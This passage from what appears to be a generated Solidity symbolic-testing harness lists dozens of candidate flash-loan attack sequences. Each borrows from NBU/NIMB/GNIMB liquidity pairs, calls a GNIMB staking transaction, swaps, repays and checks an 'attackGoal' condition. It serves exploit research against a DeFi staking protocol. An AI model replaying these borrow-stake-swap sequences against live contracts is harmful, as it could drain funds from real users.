        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4701(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4702(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4703(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4704(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4705(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4706(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4707(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4708(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4709(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4710(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4711(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4712(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4713(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4714(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4715(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4716(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4717(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4718(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4719(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4720(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4721(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4722(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4723(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4724(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4725(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4726(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4727(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4728(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4729(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4730(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4731(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4732(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4733(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4734(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4735(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4736(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4737(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4738(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4739(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4740(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4741(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4742(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4743(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4744(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
